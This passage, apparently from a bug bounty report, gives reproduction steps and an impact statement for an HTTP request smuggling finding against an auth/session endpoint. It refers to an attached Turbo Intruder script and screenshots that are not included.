2. Script for the turbo intruder is attached with name script.txt

3. Observe 200 OK response for the auth/session post request which is supposed to give invalid credentials.Please refer the attached screenshots. ( Smuggle Request1.png ) 
4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). Also attached the recorded POC for the finding.

## Impact

It is possible to smuggle the request and disrupt the user experience.
Ex : redirecting to 404 not found page , improper response from server 
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.
